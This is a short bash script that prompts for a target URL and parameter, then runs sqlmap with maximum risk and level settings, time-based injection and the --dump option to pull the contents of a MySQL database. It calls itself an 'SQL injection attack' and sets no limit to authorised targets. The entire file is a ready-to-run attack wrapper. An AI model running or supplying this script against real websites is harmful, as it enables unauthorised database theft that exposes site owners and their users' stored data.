#!/bin/bash

# Prompt the user to enter the target URL and injection point
read -p "Enter the target URL: " url
read -p "Enter the injection point: " injection_point

# Check if sqlmap is installed
if ! [ -x "$(command -v sqlmap)" ]; then
  echo "Error: sqlmap is not installed." >&2
  exit 1
fi

# Perform the SQL injection attack
echo "Running SQL injection attack with sqlmap..."
sqlmap -u "$url" --parameter "$injection_point" --risk 3 --level 5 --technique T --dbms mysql --dump

echo "SQL injection attack complete!"
